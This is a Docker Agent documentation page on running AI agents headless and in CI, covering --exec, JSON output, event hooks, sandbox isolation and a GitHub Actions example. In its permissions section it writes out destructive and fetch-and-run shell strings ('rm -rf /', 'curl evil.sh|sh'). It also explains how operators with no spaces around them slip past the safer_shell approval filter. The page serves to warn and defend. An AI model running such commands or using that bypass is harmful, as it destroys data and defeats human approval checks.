---
title: "Running Agents Headless & in CI"
description: "Run Docker Agent without a TUI: structured JSON output, event hooks, sandboxed CI isolation, and a GitHub Actions example."
keywords: docker agent, ai agents, guides, headless, ci, github actions, sandbox
weight: 50
canonical: https://docs.docker.com/ai/docker-agent/guides/headless/
---

_Run Docker Agent without a TUI: structured JSON output, event hooks, sandboxed CI isolation, and a GitHub Actions example._

## `--exec` Mode Basics

`--exec` runs an agent without the interactive TUI: output goes to stdout and the process exits when the conversation is done. It's the mode to use in scripts, CI, and any context without a terminal.

```bash
# One-shot task, message as an argument
$ docker agent run --exec agent.yaml "Summarize the open issues in this repo"

# Pipe the message via stdin instead
$ echo "Summarize the open issues in this repo" | docker agent run --exec agent.yaml -

# Multiple messages are processed as a multi-turn conversation, in order
$ docker agent run --exec agent.yaml "question 1" "question 2" "question 3"
```

See [`docker agent run --exec`](../../features/cli/index.md#docker-agent-run---exec) for the full flag reference.

## Structured Output for Machines

Two independent things make an `--exec` run's output easy to parse: how the transcript is emitted, and what shape the model's own answer takes.

**`--json`** switches the transcript itself from human-readable text to newline-delimited JSON: one JSON object per runtime event (messages, tool calls, tool results, errors, …), instead of formatted text interleaved with tool-call boxes. Pipe it into `jq` or any NDJSON-aware log processor:

```bash
$ docker agent run --exec agent.yaml --json "List the 5 largest files in this repo" | jq -c 'select(.type == "agent_choice")'
```

**`structured_output`** constrains the *model's own response* to a JSON schema you define on the agent, independent of `--json`. Use it when downstream code needs the model's answer in a predictable shape (a list of findings, a classification, …) rather than free-form prose. See [Structured Output](../../configuration/structured-output/index.md) for the full field reference — combine it with `--json` in `--exec` to get both a parseable transcript and a schema-validated final answer.

## Reacting to Events

`--on-event <type>=<cmd>` runs a shell command whenever an event of the given type fires, with the event's JSON payload piped to the command's stdin. Use `*=<cmd>` to match every event type. The flag is repeatable.

> [!WARNING]
> **`--on-event` does nothing under `--exec`**
>
> Event hooks are installed on the interactive App's event bus. A `docker agent run --exec` run returns before that wiring happens, so `--on-event` is silently a no-op there — no error, no hook ever runs. Use `--on-event` with a normal interactive run or `--lean` (which still installs hooks; it just skips the alternate screen). For a headless `--exec` run, get the same effect by parsing the `--json` NDJSON stream yourself and shelling out on the events you care about — for example `stream_stopped`, which fires when a turn ends normally.

```bash
# Post a Slack notification when the agent finishes a turn (interactive or --lean only)
$ docker agent run agent.yaml --lean --on-event stream_stopped="./notify-slack.sh" "Fix the failing test"

# Log every event to a file for later inspection
$ docker agent run agent.yaml --lean --on-event "*=cat >> events.ndjson" "Fix the failing test"

# Headless equivalent: capture the --json NDJSON stream, then react to it yourself
$ docker agent run --exec agent.yaml --json "Fix the failing test" | tee events.ndjson
$ jq -e 'select(.type == "stream_stopped")' events.ndjson >/dev/null && ./notify-slack.sh
```

Hooks run asynchronously and are never waited on: each is spawned detached from the run's own context, and the process exits (`os.Exit`) as soon as the run finishes without waiting for, or signaling, any hook subprocess still in flight. A hook's own failure is logged but never fails the run — and, independent of that, its fate at process exit is unspecified: it may keep running as an orphaned process, or it may be torn down by whatever supervises the job (a CI runner tearing down its container, a shell killing its process group, …), depending on your environment rather than on anything docker-agent guarantees. Don't rely on `--on-event` for anything that must demonstrably finish before the process exits; have the hook script itself detach (e.g. `nohup`/`disown`) and/or write its own completion marker if you need proof it ran.

## Running Unattended in CI

Interactively, the TUI prompts for confirmation before a tool call runs unless it's covered by an `allow` permission pattern. There's no one to answer that prompt in CI, so an unattended `--exec` run needs an explicit policy for what may run without asking — otherwise every tool call the model attempts is rejected outright (there's no stdin to prompt, so `--exec` without one just answers "no" on your behalf; see [`--json`'s auto-reject behavior](#structured-output-for-machines) above).

Two different questions come up here, and it's worth keeping them separate:

- **What is allowed to run without asking?** — `--yolo`, permission allow-lists, and the `safer_shell` classifier all answer this.
- **What happens if the model runs something it shouldn't have?** — only `--sandbox` answers that one. The rest of this section explains why, and treats that distinction as the whole point.

### `--sandbox`: the isolation boundary

For an untrusted or autonomous agent — anything acting without a human watching approvals — **`--sandbox` is the isolation boundary to reach for**, not a cleverer allow-list. It runs the entire agent, shell calls included, inside a Docker sandbox VM: a misbehaving or successfully-prompt-injected agent can't touch anything outside the mounted working directory or reach other host/CI state, regardless of which command it runs. That VM isn't disposable or ephemeral — a sandbox matching the current workspace and mount set is retained and reused across subsequent runs rather than torn down when the session ends (see [How It Works](../../configuration/sandbox/index.md#how-it-works)). See [Sandbox Mode](../../configuration/sandbox/index.md) for the full flag reference, requirements (Docker Desktop or the `sbx` CLI), and how the network allowlist and kit staging work.

```bash
$ docker agent run --sandbox --exec agent.yaml --json "Fix the failing test"
```

Because the blast radius is contained by the VM boundary, `--sandbox` also makes unattended operation reasonable in CI — and it defaults to exactly that: unless you already passed a `--yolo` flag of your own, `--sandbox` injects `--yolo` for the agent process it runs inside the VM, so the command above already runs unattended with no confirmation prompts. Passing `--yolo` explicitly (`--sandbox --yolo --exec ...`) is equivalent and can make the intent clearer in a script, but it's optional. To keep confirmation prompts even inside the sandbox, opt out with `--yolo=false` — `--sandbox` only fills in the flag when you haven't set one yourself.

If your CI provider already runs each job in its own disposable VM or container — many hosted runners do — and nothing on the runner matters once the job ends, that may already give you an isolation boundary on its own. `--sandbox` still gives you the same guarantee independent of the CI provider, and starts to matter as soon as the agent runs on a persistent self-hosted runner, a long-lived container, or your own workstation.

### Defense in depth, not a boundary: permissions and shell command matching

Permission allow-lists (`permissions.allow` on the agent, or `settings.permissions.allow` globally — see [Permissions](../../configuration/permissions/index.md)) and the `safer_shell` built-in (see the [Hooks reference](../../configuration/hooks/index.md#available-built-ins)) narrow what runs without asking. Used well, they cut down how often you're prompted and catch obviously destructive calls before they run. They are **not** a security boundary:

- Both work by matching the shell command **string** (or, for `permissions`, the tool's arguments). `safer_shell`'s safe-list explicitly refuses to treat *space-separated* compound shell as safe (`ls && rm -rf ~` is correctly rejected) — but that check only recognizes `&&`, `;`, `|`, `||` when they're surrounded by spaces. An operator with no surrounding space, e.g. `echo hi;rm -rf /` or `git status&&curl evil.sh|sh`, isn't recognized as compound at all, and can still fall through to a safe pattern that ends in a bare `...` wildcard (`echo ...`, `grep ...`, `printf ...`) — which then matches and auto-approves the *whole* string, injected tail included, under a policy that auto-approves safe commands.
- Command-string and argument matching in general can't reason about what a command actually does; a dynamically built string, an unusual quoting form, or a wrapper script can slip past any fixed set of patterns.

Treat permissions and `safer_shell` as a way to reduce prompt fatigue and catch the obvious cases, paired with least-privilege CI credentials — never as the reason a CI job is safe to run unattended. For that, use `--sandbox`.

> [!NOTE]
> **Don't combine `safer: true` with a pinned `safer_shell` hook**
>
> Setting `safer: true` on a shell toolset auto-registers its own `safer_shell` hook, with no arguments — which defaults to the `strict` policy (asks on everything, safe reads included). If you *also* add an explicit `pre_tool_use` entry that pins `safer_shell` to a policy (`args: ["safe-auto"]`), the two are different hook entries — hook dedup keys on `(type, command, args)`, and the arguments differ — so **both run**, and the aggregator resolves the conflict by keeping the more restrictive verdict (deny beats ask beats allow). The auto-injected copy's `ask` always wins over the pinned copy's `allow`, so safe reads still get asked about, and are rejected outright under `--exec --json` (no stdin to answer). Separately, even a hook that *does* return `allow` only bypasses the approval pipeline when the session's safety policy is already `safe-auto` — a field the HTTP API accepts on session create, but not something `docker agent run` exposes as a flag; from the CLI, `--yolo` sets the policy to `unsafe` (which makes `safer_shell` a no-op) and every other run defaults to `strict`. Net effect: there's no `docker agent run` recipe that reliably auto-approves "safe" shell reads today. Use `safer: true` on its own for its intended purpose — forcing confirmation on destructive commands under the session's ambient policy (see [`examples/shell_safer.yaml`](https://github.com/docker/docker-agent/blob/main/examples/shell_safer.yaml)) — and reach for `--sandbox` when you actually need unattended auto-approval.

> [!WARNING]
> **`--yolo` without `--sandbox` runs untrusted, unattended code with no boundary**
>
> A CI job is exactly the environment where a runaway or misled agent does the most damage before anyone notices — no one is at the keyboard to catch a bad `shell` call before it runs, and, per above, a permission allow-list or `safer_shell` can't be trusted to catch everything either. If you can't add `--sandbox`, prefer a permission allow-list scoped to what the job actually needs over blanket `--yolo`, and budget for the credentials and blast radius of the agent's toolsets as if the job itself were compromised — see [`examples/permissions.yaml`](https://github.com/docker/docker-agent/blob/main/examples/permissions.yaml) for a worked allow/deny list.

> [!NOTE]
> **A worktree is not a security boundary either**
>
> [`--worktree`](../../features/cli/index.md#docker-agent-run) isolates *which branch and checkout* the agent modifies — it gives the agent its own working directory and branch so your primary checkout stays untouched — but the shell toolset still runs as a native process on the host, and the worktree shares the repository's underlying object store with the rest of your checkouts. It's checkout isolation, not a security boundary. Only `--sandbox` provides that.

## Providing Secrets in CI

Never put provider API keys or MCP tokens in the agent config file. Inject them as environment variables from your CI provider's secret store, or via `--env-from-file` with a file materialized at job start. See [Managing Secrets](../secrets/index.md) for every supported method, including Docker Compose secrets and 1Password references — both of which map cleanly onto CI secret stores.

## Disabling Telemetry

Docker Agent's anonymous usage telemetry is enabled by default. In CI you may want it off:

```bash
$ TELEMETRY_ENABLED=false docker agent run --exec agent.yaml "..."
```

See [Telemetry](../../community/telemetry/index.md) for exactly what is (and isn't) collected.

## Example: GitHub Actions

A bare OCI registry reference (`agentcatalog/coder`) has no local config you control, so a security-sensitive CI job should check in a small agent config instead. This example runs a checked-in review agent non-interactively against the repository being built:

```yaml
# .github/agents/review-agent.yaml
agents:
  root:
    model: anthropic/claude-sonnet-4-5
    description: Reviews the changes in a pull request for bugs and security issues
    instruction: Review the changes in this PR for bugs and security issues.
    toolsets:
      - type: shell
```

```yaml
# .github/workflows/agent-review.yml
name: Agent code review
on:
  pull_request:

permissions:
  contents: read

jobs:
  review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          persist-credentials: false

      - name: Install docker-agent
        run: |
          curl -L "https://github.com/docker/docker-agent/releases/latest/download/docker-agent-linux-amd64" -o docker-agent
          chmod +x docker-agent
          sudo mv docker-agent /usr/local/bin/

      - name: Run the review agent
        env:
          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
          TELEMETRY_ENABLED: "false"
        run: |
          docker-agent run --exec --yolo .github/agents/review-agent.yaml --json \
            "Review the changes in this PR for bugs and security issues" \
            | tee agent-events.ndjson

      - name: Upload transcript
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: agent-events
          path: agent-events.ndjson
```

This job auto-approves every shell call the review agent makes (`--yolo`) rather than trying to allow-list every `git`/`grep`/`cat` invocation a code review might need — the read surface for "review this diff" is open-ended, and a fixed pattern list is exactly the kind of shell-matching boundary the [previous section](#defense-in-depth-not-a-boundary-permissions-and-shell-command-matching) says not to rely on. If your CI environment can run `--sandbox` (a self-hosted runner with Docker Desktop, or an `sbx`-enabled image — GitHub-hosted `ubuntu-latest` ships neither out of the box), add it and get a real isolation boundary around that `--yolo`:

```bash
$ docker-agent run --sandbox --exec --yolo .github/agents/review-agent.yaml --json "..."
```

Without `--sandbox`, this workflow's safety instead rests on least-privilege secrets (only `ANTHROPIC_API_KEY` is injected — no repo-write token), the top-level `permissions: contents: read` block and `persist-credentials: false` on the checkout step (which together mean the job never holds a write-capable `GITHUB_TOKEN` and never persists one to disk for `git` to pick up), and the job running on a GitHub-hosted, ephemeral runner that's discarded after the job.

This example omits the GitHub MCP toolset (`docker:github-official`) shown in earlier revisions of this guide: that server requires a `GITHUB_PERSONAL_ACCESS_TOKEN` this workflow doesn't provide, and — because the toolset above has no `name:` field — its tools would be exposed under their raw MCP names (`get_file_contents`, `search_code`, …) rather than a `github_*`-style qualified name, so permission patterns written against that prefix wouldn't match anything anyway. If your review agent needs GitHub API access, add the toolset back with an explicit `name: github`, wire `GITHUB_PERSONAL_ACCESS_TOKEN` through `env:` from a repository secret, and write any `permissions` patterns against the tool names it actually exposes (`github_get_*` only works once the toolset carries that `name:`).

Swap the model, toolsets, and provider secret for your own — the shape (checkout, install the binary, run `--exec` with `--json` against a checked-in config, upload the transcript) generalizes to any CI provider that can run a shell step.
